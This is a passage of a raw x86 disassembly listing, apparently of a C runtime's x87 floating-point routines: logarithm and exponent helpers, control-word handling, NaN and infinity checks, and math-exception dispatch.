  40ce5b:	db 2d 90 32 41 00    	fldt   0x413290
  40ce61:	c6 85 70 ff ff ff 02 	movb   $0x2,-0x90(%ebp)
  40ce68:	c3                   	ret
  40ce69:	d9 ed                	fldln2
  40ce6b:	d9 c9                	fxch   %st(1)
  40ce6d:	d9 e4                	ftst
  40ce6f:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40ce76:	9b                   	fwait
  40ce77:	f6 85 61 ff ff ff 41 	testb  $0x41,-0x9f(%ebp)
  40ce7e:	75 d2                	jne    0x40ce52
  40ce80:	d9 f1                	fyl2x
  40ce82:	c3                   	ret
  40ce83:	c6 85 70 ff ff ff 02 	movb   $0x2,-0x90(%ebp)
  40ce8a:	dd d8                	fstp   %st(0)
  40ce8c:	db 2d 9a 32 41 00    	fldt   0x41329a
  40ce92:	c3                   	ret
  40ce93:	0a c9                	or     %cl,%cl
  40ce95:	75 53                	jne    0x40ceea
  40ce97:	c3                   	ret
  40ce98:	d9 ec                	fldlg2
  40ce9a:	eb 02                	jmp    0x40ce9e
  40ce9c:	d9 ed                	fldln2
  40ce9e:	d9 c9                	fxch   %st(1)
  40cea0:	0a c9                	or     %cl,%cl
  40cea2:	75 ae                	jne    0x40ce52
  40cea4:	d9 f1                	fyl2x
  40cea6:	c3                   	ret
  40cea7:	e9 91 02 00 00       	jmp    0x40d13d
  40ceac:	e8 cf 00 00 00       	call   0x40cf80
  40ceb1:	dd d8                	fstp   %st(0)
  40ceb3:	dd d8                	fstp   %st(0)
  40ceb5:	0a c9                	or     %cl,%cl
  40ceb7:	75 0e                	jne    0x40cec7
  40ceb9:	d9 ee                	fldz
  40cebb:	83 f8 01             	cmp    $0x1,%eax
  40cebe:	75 06                	jne    0x40cec6
  40cec0:	0a ed                	or     %ch,%ch
  40cec2:	74 02                	je     0x40cec6
  40cec4:	d9 e0                	fchs
  40cec6:	c3                   	ret
  40cec7:	c6 85 70 ff ff ff 02 	movb   $0x2,-0x90(%ebp)
  40cece:	db 2d 90 32 41 00    	fldt   0x413290
  40ced4:	83 f8 01             	cmp    $0x1,%eax
  40ced7:	75 ed                	jne    0x40cec6
  40ced9:	0a ed                	or     %ch,%ch
  40cedb:	74 e9                	je     0x40cec6
  40cedd:	d9 e0                	fchs
  40cedf:	eb e5                	jmp    0x40cec6
  40cee1:	dd d8                	fstp   %st(0)
  40cee3:	e9 42 02 00 00       	jmp    0x40d12a
  40cee8:	dd d8                	fstp   %st(0)
  40ceea:	e9 13 03 00 00       	jmp    0x40d202
  40ceef:	58                   	pop    %eax
  40cef0:	d9 e4                	ftst
  40cef2:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40cef9:	9b                   	fwait
  40cefa:	f6 85 61 ff ff ff 01 	testb  $0x1,-0x9f(%ebp)
  40cf01:	75 0f                	jne    0x40cf12
  40cf03:	dd d8                	fstp   %st(0)
  40cf05:	db 2d 90 32 41 00    	fldt   0x413290
  40cf0b:	0a ed                	or     %ch,%ch
  40cf0d:	74 02                	je     0x40cf11
  40cf0f:	d9 e0                	fchs
  40cf11:	c3                   	ret
  40cf12:	c6 85 70 ff ff ff 04 	movb   $0x4,-0x90(%ebp)
  40cf19:	e9 0c 02 00 00       	jmp    0x40d12a
  40cf1e:	dd d8                	fstp   %st(0)
  40cf20:	dd d8                	fstp   %st(0)
  40cf22:	db 2d 90 32 41 00    	fldt   0x413290
  40cf28:	c6 85 70 ff ff ff 03 	movb   $0x3,-0x90(%ebp)
  40cf2f:	c3                   	ret
  40cf30:	0a c9                	or     %cl,%cl
  40cf32:	75 af                	jne    0x40cee3
  40cf34:	dd d8                	fstp   %st(0)
  40cf36:	db 2d 90 32 41 00    	fldt   0x413290
  40cf3c:	c3                   	ret
  40cf3d:	d9 c0                	fld    %st(0)
  40cf3f:	d9 e1                	fabs
  40cf41:	db 2d ae 32 41 00    	fldt   0x4132ae
  40cf47:	de d9                	fcompp
  40cf49:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40cf50:	9b                   	fwait
  40cf51:	f6 85 61 ff ff ff 41 	testb  $0x41,-0x9f(%ebp)
  40cf58:	75 95                	jne    0x40ceef
  40cf5a:	d9 c0                	fld    %st(0)
  40cf5c:	d9 fc                	frndint
  40cf5e:	d9 e4                	ftst
  40cf60:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40cf67:	9b                   	fwait
  40cf68:	8a 95 61 ff ff ff    	mov    -0x9f(%ebp),%dl
  40cf6e:	d9 c9                	fxch   %st(1)
  40cf70:	d8 e1                	fsub   %st(1),%st
  40cf72:	d9 e4                	ftst
  40cf74:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40cf7b:	d9 e1                	fabs
  40cf7d:	d9 f0                	f2xm1
  40cf7f:	c3                   	ret
  40cf80:	d9 c0                	fld    %st(0)
  40cf82:	d9 fc                	frndint
  40cf84:	d8 d9                	fcomp  %st(1)
  40cf86:	9b df e0             	fstsw  %ax
  40cf89:	9e                   	sahf
  40cf8a:	75 1a                	jne    0x40cfa6
  40cf8c:	d9 c0                	fld    %st(0)
  40cf8e:	dc 0d c2 32 41 00    	fmull  0x4132c2
  40cf94:	d9 c0                	fld    %st(0)
  40cf96:	d9 fc                	frndint
  40cf98:	de d9                	fcompp
  40cf9a:	9b df e0             	fstsw  %ax
  40cf9d:	9e                   	sahf
  40cf9e:	74 0d                	je     0x40cfad
  40cfa0:	b8 01 00 00 00       	mov    $0x1,%eax
  40cfa5:	c3                   	ret
  40cfa6:	b8 00 00 00 00       	mov    $0x0,%eax
  40cfab:	eb f8                	jmp    0x40cfa5
  40cfad:	b8 02 00 00 00       	mov    $0x2,%eax
  40cfb2:	eb f1                	jmp    0x40cfa5
  40cfb4:	56                   	push   %esi
  40cfb5:	83 ec 74             	sub    $0x74,%esp
  40cfb8:	8b f4                	mov    %esp,%esi
  40cfba:	56                   	push   %esi
  40cfbb:	83 ec 08             	sub    $0x8,%esp
  40cfbe:	dd 1c 24             	fstpl  (%esp)
  40cfc1:	83 ec 08             	sub    $0x8,%esp
  40cfc4:	dd 1c 24             	fstpl  (%esp)
  40cfc7:	9b dd 76 08          	fsave  0x8(%esi)
  40cfcb:	e8 74 07 00 00       	call   0x40d744
  40cfd0:	83 c4 14             	add    $0x14,%esp
  40cfd3:	dd 66 08             	frstor 0x8(%esi)
  40cfd6:	dd 06                	fldl   (%esi)
  40cfd8:	83 c4 74             	add    $0x74,%esp
  40cfdb:	5e                   	pop    %esi
  40cfdc:	85 c0                	test   %eax,%eax
  40cfde:	74 05                	je     0x40cfe5
  40cfe0:	e9 2e 02 00 00       	jmp    0x40d213
  40cfe5:	c3                   	ret
  40cfe6:	cc                   	int3
  40cfe7:	cc                   	int3
  40cfe8:	cc                   	int3
  40cfe9:	cc                   	int3
  40cfea:	cc                   	int3
  40cfeb:	cc                   	int3
  40cfec:	cc                   	int3
  40cfed:	cc                   	int3
  40cfee:	cc                   	int3
  40cfef:	cc                   	int3
  40cff0:	80 7a 0e 05          	cmpb   $0x5,0xe(%edx)
  40cff4:	75 11                	jne    0x40d007
  40cff6:	66 8b 9d 5c ff ff ff 	mov    -0xa4(%ebp),%bx
  40cffd:	80 cf 02             	or     $0x2,%bh
  40d000:	80 e7 fe             	and    $0xfe,%bh
  40d003:	b3 3f                	mov    $0x3f,%bl
  40d005:	eb 04                	jmp    0x40d00b
  40d007:	66 bb 3f 13          	mov    $0x133f,%bx
  40d00b:	66 89 9d 5e ff ff ff 	mov    %bx,-0xa2(%ebp)
  40d012:	d9 ad 5e ff ff ff    	fldcw  -0xa2(%ebp)
  40d018:	bb 1e 33 41 00       	mov    $0x41331e,%ebx
  40d01d:	d9 e5                	fxam
  40d01f:	89 95 6c ff ff ff    	mov    %edx,-0x94(%ebp)
  40d025:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40d02c:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  40d033:	9b                   	fwait
  40d034:	8a 8d 61 ff ff ff    	mov    -0x9f(%ebp),%cl
  40d03a:	d0 e1                	shl    $1,%cl
  40d03c:	d0 f9                	sar    $1,%cl
  40d03e:	d0 c1                	rol    $1,%cl
  40d040:	8a c1                	mov    %cl,%al
  40d042:	24 0f                	and    $0xf,%al
  40d044:	d7                   	xlat   %ds:(%ebx)
  40d045:	0f be c0             	movsbl %al,%eax
  40d048:	81 e1 04 04 00 00    	and    $0x404,%ecx
  40d04e:	8b da                	mov    %edx,%ebx
  40d050:	03 d8                	add    %eax,%ebx
  40d052:	83 c3 10             	add    $0x10,%ebx
  40d055:	50                   	push   %eax
  40d056:	52                   	push   %edx
  40d057:	51                   	push   %ecx
  40d058:	8b 0b                	mov    (%ebx),%ecx
  40d05a:	ff 15 24 f2 40 00    	call   *0x40f224
  40d060:	59                   	pop    %ecx
  40d061:	5a                   	pop    %edx
  40d062:	58                   	pop    %eax
  40d063:	ff 23                	jmp    *(%ebx)
  40d065:	80 7a 0e 05          	cmpb   $0x5,0xe(%edx)
  40d069:	75 11                	jne    0x40d07c
  40d06b:	66 8b 9d 5c ff ff ff 	mov    -0xa4(%ebp),%bx
  40d072:	80 cf 02             	or     $0x2,%bh
  40d075:	80 e7 fe             	and    $0xfe,%bh
  40d078:	b3 3f                	mov    $0x3f,%bl
  40d07a:	eb 04                	jmp    0x40d080
  40d07c:	66 bb 3f 13          	mov    $0x133f,%bx
  40d080:	66 89 9d 5e ff ff ff 	mov    %bx,-0xa2(%ebp)
  40d087:	d9 ad 5e ff ff ff    	fldcw  -0xa2(%ebp)
  40d08d:	bb 1e 33 41 00       	mov    $0x41331e,%ebx
  40d092:	d9 e5                	fxam
  40d094:	89 95 6c ff ff ff    	mov    %edx,-0x94(%ebp)
  40d09a:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40d0a1:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  40d0a8:	d9 c9                	fxch   %st(1)
  40d0aa:	8a 8d 61 ff ff ff    	mov    -0x9f(%ebp),%cl
  40d0b0:	d9 e5                	fxam
  40d0b2:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40d0b9:	d9 c9                	fxch   %st(1)
  40d0bb:	8a ad 61 ff ff ff    	mov    -0x9f(%ebp),%ch
  40d0c1:	d0 e5                	shl    $1,%ch
  40d0c3:	d0 fd                	sar    $1,%ch
  40d0c5:	d0 c5                	rol    $1,%ch
  40d0c7:	8a c5                	mov    %ch,%al
  40d0c9:	24 0f                	and    $0xf,%al
  40d0cb:	d7                   	xlat   %ds:(%ebx)
  40d0cc:	8a e0                	mov    %al,%ah
  40d0ce:	d0 e1                	shl    $1,%cl
  40d0d0:	d0 f9                	sar    $1,%cl
  40d0d2:	d0 c1                	rol    $1,%cl
  40d0d4:	8a c1                	mov    %cl,%al
  40d0d6:	24 0f                	and    $0xf,%al
  40d0d8:	d7                   	xlat   %ds:(%ebx)
  40d0d9:	d0 e4                	shl    $1,%ah
  40d0db:	d0 e4                	shl    $1,%ah
  40d0dd:	0a c4                	or     %ah,%al
  40d0df:	0f be c0             	movsbl %al,%eax
  40d0e2:	81 e1 04 04 00 00    	and    $0x404,%ecx
  40d0e8:	8b da                	mov    %edx,%ebx
  40d0ea:	03 d8                	add    %eax,%ebx
  40d0ec:	83 c3 10             	add    $0x10,%ebx
  40d0ef:	50                   	push   %eax
  40d0f0:	52                   	push   %edx
  40d0f1:	51                   	push   %ecx
  40d0f2:	8b 0b                	mov    (%ebx),%ecx
  40d0f4:	ff 15 24 f2 40 00    	call   *0x40f224
  40d0fa:	59                   	pop    %ecx
  40d0fb:	5a                   	pop    %edx
  40d0fc:	58                   	pop    %eax
  40d0fd:	ff 23                	jmp    *(%ebx)
  40d0ff:	e8 0f 01 00 00       	call   0x40d213
  40d104:	d9 c9                	fxch   %st(1)
  40d106:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40d10d:	8d 49 00             	lea    0x0(%ecx),%ecx
  40d110:	dd d8                	fstp   %st(0)
  40d112:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40d119:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40d120:	c3                   	ret
  40d121:	e8 ed 00 00 00       	call   0x40d213
  40d126:	eb e8                	jmp    0x40d110
  40d128:	dd d8                	fstp   %st(0)
  40d12a:	dd d8                	fstp   %st(0)
  40d12c:	d9 ee                	fldz
  40d12e:	c3                   	ret
  40d12f:	90                   	nop
  40d130:	dd d8                	fstp   %st(0)
  40d132:	dd d8                	fstp   %st(0)
  40d134:	d9 ee                	fldz
  40d136:	84 ed                	test   %ch,%ch
  40d138:	74 02                	je     0x40d13c
  40d13a:	d9 e0                	fchs
  40d13c:	c3                   	ret
  40d13d:	dd d8                	fstp   %st(0)
  40d13f:	90                   	nop
  40d140:	dd d8                	fstp   %st(0)
  40d142:	d9 e8                	fld1
  40d144:	c3                   	ret
  40d145:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40d14c:	8d 64 24 00          	lea    0x0(%esp),%esp
  40d150:	db bd 62 ff ff ff    	fstpt  -0x9e(%ebp)
  40d156:	db ad 62 ff ff ff    	fldt   -0x9e(%ebp)
  40d15c:	f6 85 69 ff ff ff 40 	testb  $0x40,-0x97(%ebp)
  40d163:	74 08                	je     0x40d16d
  40d165:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  40d16c:	c3                   	ret
  40d16d:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  40d174:	dc 05 0e 33 41 00    	faddl  0x41330e
  40d17a:	c3                   	ret
  40d17b:	eb 03                	jmp    0x40d180
  40d17d:	cc                   	int3
  40d17e:	cc                   	int3
  40d17f:	cc                   	int3
  40d180:	d9 c9                	fxch   %st(1)
  40d182:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40d189:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40d190:	db bd 62 ff ff ff    	fstpt  -0x9e(%ebp)
  40d196:	db ad 62 ff ff ff    	fldt   -0x9e(%ebp)
  40d19c:	f6 85 69 ff ff ff 40 	testb  $0x40,-0x97(%ebp)
  40d1a3:	74 09                	je     0x40d1ae
  40d1a5:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  40d1ac:	eb 07                	jmp    0x40d1b5
  40d1ae:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  40d1b5:	de c1                	faddp  %st,%st(1)
  40d1b7:	c3                   	ret
  40d1b8:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40d1bf:	90                   	nop
  40d1c0:	db bd 62 ff ff ff    	fstpt  -0x9e(%ebp)
  40d1c6:	db ad 62 ff ff ff    	fldt   -0x9e(%ebp)
  40d1cc:	f6 85 69 ff ff ff 40 	testb  $0x40,-0x97(%ebp)
  40d1d3:	74 20                	je     0x40d1f5
  40d1d5:	d9 c9                	fxch   %st(1)
  40d1d7:	db bd 62 ff ff ff    	fstpt  -0x9e(%ebp)
  40d1dd:	db ad 62 ff ff ff    	fldt   -0x9e(%ebp)
  40d1e3:	f6 85 69 ff ff ff 40 	testb  $0x40,-0x97(%ebp)
  40d1ea:	74 09                	je     0x40d1f5
  40d1ec:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  40d1f3:	eb 07                	jmp    0x40d1fc
  40d1f5:	c6 85 70 ff ff ff 01 	movb   $0x1,-0x90(%ebp)
  40d1fc:	de c1                	faddp  %st,%st(1)
  40d1fe:	c3                   	ret
  40d1ff:	90                   	nop
  40d200:	dd d8                	fstp   %st(0)
  40d202:	dd d8                	fstp   %st(0)
  40d204:	db 2d f0 32 41 00    	fldt   0x4132f0
  40d20a:	80 bd 70 ff ff ff 00 	cmpb   $0x0,-0x90(%ebp)
  40d211:	7f 07                	jg     0x40d21a
  40d213:	c6 85 70 ff ff ff 01 	movb   $0x1,-0x90(%ebp)
  40d21a:	0a c9                	or     %cl,%cl
  40d21c:	c3                   	ret
  40d21d:	8d 49 00             	lea    0x0(%ecx),%ecx
  40d220:	dd d8                	fstp   %st(0)
  40d222:	dd d8                	fstp   %st(0)
  40d224:	db 2d 04 33 41 00    	fldt   0x413304
  40d22a:	0a ed                	or     %ch,%ch
  40d22c:	74 02                	je     0x40d230
  40d22e:	d9 e0                	fchs
  40d230:	0a c9                	or     %cl,%cl
  40d232:	74 08                	je     0x40d23c
  40d234:	dd 05 16 33 41 00    	fldl   0x413316
  40d23a:	de c9                	fmulp  %st,%st(1)
  40d23c:	c3                   	ret
  40d23d:	0a c9                	or     %cl,%cl
  40d23f:	74 02                	je     0x40d243
  40d241:	d9 e0                	fchs
  40d243:	c3                   	ret
  40d244:	cc                   	int3
  40d245:	cc                   	int3
  40d246:	cc                   	int3
  40d247:	cc                   	int3
  40d248:	cc                   	int3
  40d249:	cc                   	int3
  40d24a:	cc                   	int3
  40d24b:	cc                   	int3
  40d24c:	cc                   	int3
  40d24d:	cc                   	int3
  40d24e:	cc                   	int3
  40d24f:	cc                   	int3
  40d250:	d9 c0                	fld    %st(0)
  40d252:	d9 fc                	frndint
  40d254:	dc e1                	fsub   %st,%st(1)
  40d256:	d9 c9                	fxch   %st(1)
  40d258:	d9 e0                	fchs
  40d25a:	d9 f0                	f2xm1
  40d25c:	d9 e8                	fld1
  40d25e:	de c1                	faddp  %st,%st(1)
  40d260:	d9 fd                	fscale
  40d262:	dd d9                	fstp   %st(1)
  40d264:	c3                   	ret
  40d265:	8b 54 24 04          	mov    0x4(%esp),%edx
  40d269:	81 e2 00 03 00 00    	and    $0x300,%edx
  40d26f:	83 ca 7f             	or     $0x7f,%edx
  40d272:	66 89 54 24 06       	mov    %dx,0x6(%esp)
  40d277:	d9 6c 24 06          	fldcw  0x6(%esp)
  40d27b:	c3                   	ret
  40d27c:	a9 00 00 08 00       	test   $0x80000,%eax
  40d281:	74 06                	je     0x40d289
  40d283:	b8 00 00 00 00       	mov    $0x0,%eax
  40d288:	c3                   	ret
  40d289:	dc 05 30 33 41 00    	faddl  0x413330
  40d28f:	b8 00 00 00 00       	mov    $0x0,%eax
  40d294:	c3                   	ret
  40d295:	8b 42 04             	mov    0x4(%edx),%eax
  40d298:	25 00 00 f0 7f       	and    $0x7ff00000,%eax
  40d29d:	3d 00 00 f0 7f       	cmp    $0x7ff00000,%eax
  40d2a2:	74 03                	je     0x40d2a7
  40d2a4:	dd 02                	fldl   (%edx)
  40d2a6:	c3                   	ret
  40d2a7:	8b 42 04             	mov    0x4(%edx),%eax
  40d2aa:	83 ec 0a             	sub    $0xa,%esp
  40d2ad:	0d 00 00 ff 7f       	or     $0x7fff0000,%eax
  40d2b2:	89 44 24 06          	mov    %eax,0x6(%esp)
  40d2b6:	8b 42 04             	mov    0x4(%edx),%eax
  40d2b9:	8b 0a                	mov    (%edx),%ecx
  40d2bb:	0f a4 c8 0b          	shld   $0xb,%ecx,%eax
  40d2bf:	c1 e1 0b             	shl    $0xb,%ecx
  40d2c2:	89 44 24 04          	mov    %eax,0x4(%esp)
  40d2c6:	89 0c 24             	mov    %ecx,(%esp)
  40d2c9:	db 2c 24             	fldt   (%esp)
  40d2cc:	83 c4 0a             	add    $0xa,%esp
  40d2cf:	a9 00 00 00 00       	test   $0x0,%eax
  40d2d4:	8b 42 04             	mov    0x4(%edx),%eax
  40d2d7:	c3                   	ret
  40d2d8:	8b 44 24 08          	mov    0x8(%esp),%eax
  40d2dc:	25 00 00 f0 7f       	and    $0x7ff00000,%eax
  40d2e1:	3d 00 00 f0 7f       	cmp    $0x7ff00000,%eax
  40d2e6:	74 01                	je     0x40d2e9
  40d2e8:	c3                   	ret
  40d2e9:	8b 44 24 08          	mov    0x8(%esp),%eax
  40d2ed:	c3                   	ret
  40d2ee:	66 81 3c 24 7f 02    	cmpw   $0x27f,(%esp)
  40d2f4:	74 03                	je     0x40d2f9
  40d2f6:	d9 2c 24             	fldcw  (%esp)
  40d2f9:	5a                   	pop    %edx
  40d2fa:	c3                   	ret
  40d2fb:	66 8b 04 24          	mov    (%esp),%ax
  40d2ff:	66 3d 7f 02          	cmp    $0x27f,%ax
  40d303:	74 1e                	je     0x40d323
  40d305:	66 83 e0 20          	and    $0x20,%ax
  40d309:	74 15                	je     0x40d320
  40d30b:	9b df e0             	fstsw  %ax
  40d30e:	66 83 e0 20          	and    $0x20,%ax
  40d312:	74 0c                	je     0x40d320
  40d314:	b8 08 00 00 00       	mov    $0x8,%eax
  40d319:	e8 d9 00 00 00       	call   0x40d3f7
  40d31e:	5a                   	pop    %edx
  40d31f:	c3                   	ret
  40d320:	d9 2c 24             	fldcw  (%esp)
  40d323:	5a                   	pop    %edx
  40d324:	c3                   	ret
  40d325:	83 ec 08             	sub    $0x8,%esp
  40d328:	dd 14 24             	fstl   (%esp)
  40d32b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40d32f:	83 c4 08             	add    $0x8,%esp
  40d332:	25 00 00 f0 7f       	and    $0x7ff00000,%eax
  40d337:	eb 14                	jmp    0x40d34d
  40d339:	83 ec 08             	sub    $0x8,%esp
  40d33c:	dd 14 24             	fstl   (%esp)
  40d33f:	8b 44 24 04          	mov    0x4(%esp),%eax
  40d343:	83 c4 08             	add    $0x8,%esp
  40d346:	25 00 00 f0 7f       	and    $0x7ff00000,%eax
  40d34b:	74 3d                	je     0x40d38a
  40d34d:	3d 00 00 f0 7f       	cmp    $0x7ff00000,%eax
  40d352:	74 5f                	je     0x40d3b3
  40d354:	66 8b 04 24          	mov    (%esp),%ax
  40d358:	66 3d 7f 02          	cmp    $0x27f,%ax
  40d35c:	74 2a                	je     0x40d388
  40d35e:	66 83 e0 20          	and    $0x20,%ax
  40d362:	75 21                	jne    0x40d385
  40d364:	9b df e0             	fstsw  %ax
  40d367:	66 83 e0 20          	and    $0x20,%ax
  40d36b:	74 18                	je     0x40d385
  40d36d:	b8 08 00 00 00       	mov    $0x8,%eax
  40d372:	83 fa 1d             	cmp    $0x1d,%edx
  40d375:	74 07                	je     0x40d37e
  40d377:	e8 7b 00 00 00       	call   0x40d3f7
  40d37c:	5a                   	pop    %edx
  40d37d:	c3                   	ret
  40d37e:	e8 5d 00 00 00       	call   0x40d3e0
  40d383:	5a                   	pop    %edx
  40d384:	c3                   	ret
  40d385:	d9 2c 24             	fldcw  (%esp)
  40d388:	5a                   	pop    %edx
  40d389:	c3                   	ret
  40d38a:	dd 05 5c 33 41 00    	fldl   0x41335c
  40d390:	d9 c9                	fxch   %st(1)
  40d392:	d9 fd                	fscale
  40d394:	dd d9                	fstp   %st(1)
  40d396:	d9 c0                	fld    %st(0)
  40d398:	d9 e1                	fabs
  40d39a:	dc 1d 4c 33 41 00    	fcompl 0x41334c
  40d3a0:	9b df e0             	fstsw  %ax
  40d3a3:	9e                   	sahf
  40d3a4:	b8 04 00 00 00       	mov    $0x4,%eax
  40d3a9:	73 c7                	jae    0x40d372
  40d3ab:	dc 0d 6c 33 41 00    	fmull  0x41336c
  40d3b1:	eb bf                	jmp    0x40d372
  40d3b3:	dd 05 54 33 41 00    	fldl   0x413354
  40d3b9:	d9 c9                	fxch   %st(1)
  40d3bb:	d9 fd                	fscale
  40d3bd:	dd d9                	fstp   %st(1)
  40d3bf:	d9 c0                	fld    %st(0)
  40d3c1:	d9 e1                	fabs
  40d3c3:	dc 1d 44 33 41 00    	fcompl 0x413344
  40d3c9:	9b df e0             	fstsw  %ax
  40d3cc:	9e                   	sahf
  40d3cd:	b8 03 00 00 00       	mov    $0x3,%eax
  40d3d2:	76 9e                	jbe    0x40d372
  40d3d4:	dc 0d 64 33 41 00    	fmull  0x413364
  40d3da:	eb 96                	jmp    0x40d372
  40d3dc:	cc                   	int3
  40d3dd:	cc                   	int3
  40d3de:	cc                   	int3
  40d3df:	cc                   	int3
  40d3e0:	55                   	push   %ebp
  40d3e1:	8b ec                	mov    %esp,%ebp
  40d3e3:	83 c4 e0             	add    $0xffffffe0,%esp
  40d3e6:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40d3e9:	8b 45 18             	mov    0x18(%ebp),%eax
  40d3ec:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40d3ef:	8b 45 1c             	mov    0x1c(%ebp),%eax
  40d3f2:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40d3f5:	eb 09                	jmp    0x40d400
  40d3f7:	55                   	push   %ebp
  40d3f8:	8b ec                	mov    %esp,%ebp
  40d3fa:	83 c4 e0             	add    $0xffffffe0,%esp
  40d3fd:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40d400:	dd 5d f8             	fstpl  -0x8(%ebp)
  40d403:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40d406:	8b 45 10             	mov    0x10(%ebp),%eax
  40d409:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40d40c:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40d40f:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40d412:	8d 45 08             	lea    0x8(%ebp),%eax
  40d415:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40d418:	50                   	push   %eax
  40d419:	51                   	push   %ecx
  40d41a:	52                   	push   %edx
  40d41b:	e8 4f 04 00 00       	call   0x40d86f
  40d420:	83 c4 0c             	add    $0xc,%esp
  40d423:	dd 45 f8             	fldl   -0x8(%ebp)
  40d426:	66 81 7d 08 7f 02    	cmpw   $0x27f,0x8(%ebp)
  40d42c:	74 03                	je     0x40d431
  40d42e:	d9 6d 08             	fldcw  0x8(%ebp)
  40d431:	c9                   	leave
  40d432:	c3                   	ret
  40d433:	8b ff                	mov    %edi,%edi
  40d435:	55                   	push   %ebp
  40d436:	8b ec                	mov    %esp,%ebp
  40d438:	83 ec 20             	sub    $0x20,%esp
  40d43b:	83 3d 0c 73 41 00 00 	cmpl   $0x0,0x41730c
  40d442:	56                   	push   %esi
  40d443:	57                   	push   %edi
  40d444:	74 10                	je     0x40d456
  40d446:	ff 35 28 73 41 00    	push   0x417328
  40d44c:	ff 15 f4 f1 40 00    	call   *0x40f1f4
  40d452:	8b f8                	mov    %eax,%edi
  40d454:	eb 05                	jmp    0x40d45b
  40d456:	bf 88 5b 40 00       	mov    $0x405b88,%edi
  40d45b:	8b 45 14             	mov    0x14(%ebp),%eax
  40d45e:	83 f8 1a             	cmp    $0x1a,%eax
  40d461:	0f 8f de 00 00 00    	jg     0x40d545
  40d467:	0f 84 cc 00 00 00    	je     0x40d539
  40d46d:	83 f8 0e             	cmp    $0xe,%eax
  40d470:	7f 65                	jg     0x40d4d7
  40d472:	74 50                	je     0x40d4c4
  40d474:	6a 02                	push   $0x2
  40d476:	59                   	pop    %ecx
  40d477:	2b c1                	sub    %ecx,%eax
  40d479:	74 3a                	je     0x40d4b5
  40d47b:	83 e8 01             	sub    $0x1,%eax
  40d47e:	74 29                	je     0x40d4a9
  40d480:	83 e8 05             	sub    $0x5,%eax
  40d483:	74 15                	je     0x40d49a
  40d485:	83 e8 01             	sub    $0x1,%eax
  40d488:	0f 85 95 01 00 00    	jne    0x40d623
  40d48e:	c7 45 e4 78 33 41 00 	movl   $0x413378,-0x1c(%ebp)
  40d495:	e9 01 01 00 00       	jmp    0x40d59b
  40d49a:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40d49d:	c7 45 e4 78 33 41 00 	movl   $0x413378,-0x1c(%ebp)
  40d4a4:	e9 3f 01 00 00       	jmp    0x40d5e8
  40d4a9:	c7 45 e4 74 33 41 00 	movl   $0x413374,-0x1c(%ebp)
  40d4b0:	e9 e6 00 00 00       	jmp    0x40d59b
  40d4b5:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40d4b8:	c7 45 e4 74 33 41 00 	movl   $0x413374,-0x1c(%ebp)
  40d4bf:	e9 24 01 00 00       	jmp    0x40d5e8
  40d4c4:	c7 45 e0 03 00 00 00 	movl   $0x3,-0x20(%ebp)
  40d4cb:	c7 45 e4 80 33 41 00 	movl   $0x413380,-0x1c(%ebp)
  40d4d2:	e9 11 01 00 00       	jmp    0x40d5e8
  40d4d7:	83 e8 0f             	sub    $0xf,%eax
  40d4da:	74 54                	je     0x40d530
  40d4dc:	83 e8 09             	sub    $0x9,%eax
  40d4df:	74 43                	je     0x40d524
  40d4e1:	83 e8 01             	sub    $0x1,%eax
  40d4e4:	0f 85 39 01 00 00    	jne    0x40d623
  40d4ea:	c7 45 e4 84 33 41 00 	movl   $0x413384,-0x1c(%ebp)
  40d4f1:	8b 45 08             	mov    0x8(%ebp),%eax
  40d4f4:	8b cf                	mov    %edi,%ecx
  40d4f6:	8b 75 10             	mov    0x10(%ebp),%esi
  40d4f9:	c7 45 e0 04 00 00 00 	movl   $0x4,-0x20(%ebp)
  40d500:	dd 00                	fldl   (%eax)
  40d502:	8b 45 0c             	mov    0xc(%ebp),%eax
  40d505:	dd 5d e8             	fstpl  -0x18(%ebp)
  40d508:	dd 00                	fldl   (%eax)
  40d50a:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40d50d:	dd 5d f0             	fstpl  -0x10(%ebp)
  40d510:	dd 06                	fldl   (%esi)
  40d512:	50                   	push   %eax
  40d513:	dd 5d f8             	fstpl  -0x8(%ebp)
  40d516:	ff 15 24 f2 40 00    	call   *0x40f224
  40d51c:	ff d7                	call   *%edi
  40d51e:	59                   	pop    %ecx
  40d51f:	e9 fa 00 00 00       	jmp    0x40d61e
  40d524:	c7 45 e0 03 00 00 00 	movl   $0x3,-0x20(%ebp)
  40d52b:	e9 b1 00 00 00       	jmp    0x40d5e1
  40d530:	c7 45 e4 80 33 41 00 	movl   $0x413380,-0x1c(%ebp)
